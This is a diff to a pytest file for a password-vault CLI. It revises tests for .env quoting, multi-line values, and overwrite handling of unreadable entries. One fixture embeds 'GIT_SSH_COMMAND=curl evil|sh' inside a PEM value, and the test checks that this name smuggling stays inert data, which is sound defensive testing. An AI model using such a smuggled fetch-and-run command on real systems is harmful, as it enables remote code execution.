@@ -30,7 +30,7 @@ from sofiavault.cli import (
 )
 from sofiavault.core import create_master_record
 from sofiavault.storage import (
-    get_entry_by_service,
+    delete_entry,
     get_password,
     get_schema_version,
     init_db,
@@ -757,16 +757,61 @@ def test_t3_partial_env_import_message_is_accurate():
     assert "Nothing was imported." in src  # still used for the parse-time abort
 
 
-# ── u1: quoting cases the right-to-left scan got wrong ───────────────────────
+# ── u1: quoting — what works, and the two ambiguities that cannot ────────────
 
-def test_u1_junk_after_close_rejects_the_line_and_keeps_later_pairs():
-    pairs = _import_pairs('FOO="bar" baz\nDB_PASSWORD=hunter2\nAPI_KEY="abc"\n')
-    assert pairs["FOO"] is None            # rejected, not swallowed
-    assert pairs["DB_PASSWORD"] == "hunter2"
-    assert pairs["API_KEY"] == "abc"
+@pytest.mark.parametrize("line,expected", [
+    ('URL="https://x.io" # prod', "https://x.io"),                  # r5
+    ('TITLE="The "Big" # 1 Album"', 'The "Big" # 1 Album'),         # quote before #
+    ("PASS='it's-secret'", "it's-secret"),                          # interior quote
+    ("WIN_DIR='C:\\tools\\'", "C:\\tools\\"),               # trailing backslash
+    ('K="say \\"hi\\""', 'say \\"hi\\"'),                   # no unescaping
+])
+def test_u1_single_line_quoting(line, expected):
+    pairs = _import_pairs(line + "\nNEXT=plain\n")
+    assert list(pairs.values())[0] == expected
+    assert pairs["NEXT"] == "plain"
 
 
-def test_u1_junk_after_close_aborts_the_import_end_to_end():
+@pytest.mark.parametrize("text,expected", [
+    ('PEM="a\nb"  # note\n', "a\nb"),                              # s5
+    ("NOTE='it's a multi-line\nnote'\n", "it's a multi-line\nnote"),
+    ('CERT="-----BEGIN "X509" CERT-----\nabc\n-----END CERT-----"\n',
+     '-----BEGIN "X509" CERT-----\nabc\n-----END CERT-----'),
+    ('CFG="{\n  "a": 1\n}"\n', '{\n  "a": 1\n}'),
+])
+def test_u1_multiline_quoting(text, expected):
+    pairs = _import_pairs(text + "NEXT=plain\n")
+    assert list(pairs.values())[0] == expected
+    assert pairs["NEXT"] == "plain"
+
+
+def test_u1_name_smuggling_stays_data():
+    pairs = _import_pairs(
+        'PEM="-----BEGIN\nGIT_SSH_COMMAND=curl evil|sh\n-----END"\nNEXT=p\n')
+    assert list(pairs) == ["PEM", "NEXT"]
+    assert "GIT_SSH_COMMAND" in pairs["PEM"]
+
+
+# The two ambiguities the format cannot resolve. Pinned deliberately: both
+# are documented in _iter_env_pairs and SECURITY.md, and any change to
+# them should be a conscious one, not a silent drift.
+
+def test_u1_known_limit_comment_after_a_line_ending_in_quote_is_kept():
+    # Indistinguishable from a value that legitimately ends in a quote
+    # (TITLE above), so the comment is kept rather than guessed away.
+    pairs = _import_pairs('PW="hunter2" # rotate with the "primary"\n')
+    assert pairs["PW"] == 'hunter2" # rotate with the "primary'
+
+
+def test_u1_known_limit_junk_after_close_reads_as_multiline():
+    # Same shape as the opening line of a legitimate multi-line value
+    # (NOTE above), so it consumes rather than inventing a variable name.
+    pairs = _import_pairs('FOO="bar" baz\nDB_PASSWORD=hunter2\n')
+    assert "DB_PASSWORD" not in pairs
+    assert pairs["FOO"] is None          # unterminated -> import aborts
+
+
+def test_u1_known_limit_aborts_the_import_rather_than_importing_wrongly():
     v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
     env_file = v.path.with_name("app.env")
     env_file.write_text('FOO="bar" baz\nDB_PASSWORD=hunter2\n')
@@ -774,17 +819,6 @@ def test_u1_junk_after_close_aborts_the_import_end_to_end():
         envload.import_env_file(v, env_file)
     assert v.list_entries() == []
     v.close()
-
-
-@pytest.mark.parametrize("line,expected", [
-    ('PW="hunter2" # rotate with the "primary"', "hunter2"),
-    ("TOKEN='abc' # see ticket 'OPS-12'", "abc"),
-    ('URL="https://x.io" # prod', "https://x.io"),
-])
-def test_u1_trailing_comment_containing_quotes_is_stripped(line, expected):
-    pairs = _import_pairs(line + "\nNEXT=plain\n")
-    assert list(pairs.values())[0] == expected
-    assert pairs["NEXT"] == "plain"
 
 
 # ── u2: cmd_edit needs the vanished-row check too ────────────────────────────
@@ -811,7 +845,7 @@ def test_u2_edit_reports_failure_when_the_row_vanished(capsys):
 
 # ── u3: cmd_add must leave a usable way out for an unreadable entry ──────────
 
-def test_u3_add_replaces_an_unreadable_entry_in_place(capsys):
+def test_u3_add_refuses_to_overwrite_an_unreadable_entry(capsys):
     session = _session_with_entry()
     entry_id = session.entries[0].id
     session.conn.execute("UPDATE entries_v2 SET blob = ? WHERE id = ?",
@@ -824,15 +858,15 @@ def test_u3_add_replaces_an_unreadable_entry_in_place(capsys):
         cmd_add(session)
 
     out = capsys.readouterr().out
-    assert "could not be decrypted and has been replaced" in out
-    session.reload()
-    entry = get_entry_by_service(session.entries, "amazon")
-    assert entry is not None
-    assert get_password(session.conn, session.key, entry.id) == "recovered"
-    # replaced in place: still one row, same id, single commit
-    assert entry.id == entry_id
-    assert session.conn.execute(
-        "SELECT COUNT(*) FROM entries_v2").fetchone()[0] == 1
+    assert "could not be decrypted" in out
+    assert "was not overwritten" in out
+    assert "delete amazon" in out          # a route the CLI can actually run
+    # ciphertext untouched: one row, unchanged, nothing re-encrypted
+    row = session.conn.execute(
+        "SELECT id, blob FROM entries_v2").fetchall()
+    assert len(row) == 1
+    assert row[0][0] == entry_id
+    assert row[0][1] == b"\x00" * 40
 
 
 # ── u4: the library wrapper must inherit the session's latched flag ──────────
@@ -843,9 +877,14 @@ def test_u4_vault_wrapper_inherits_latched_tamper_flag():
     assert _vault_from_session(session).tampered is True
 
 
-def test_u4_vault_wrapper_is_reused_not_rebuilt():
+def test_u4_vault_wrapper_sees_writes_made_through_the_session():
     session = _session_with_entry()
-    assert _vault_from_session(session) is _vault_from_session(session)
+    assert [e.service for e in _vault_from_session(session).list_entries()] \
+        == ["amazon"]
+    # A CLI-side write goes through storage, not the wrapper.
+    delete_entry(session.conn, session.entries[0].id, session.key)
+    session.reload()
+    assert _vault_from_session(session).list_entries() == []
 
 
 def test_s10_wipe_targets_include_shm_sidecars():
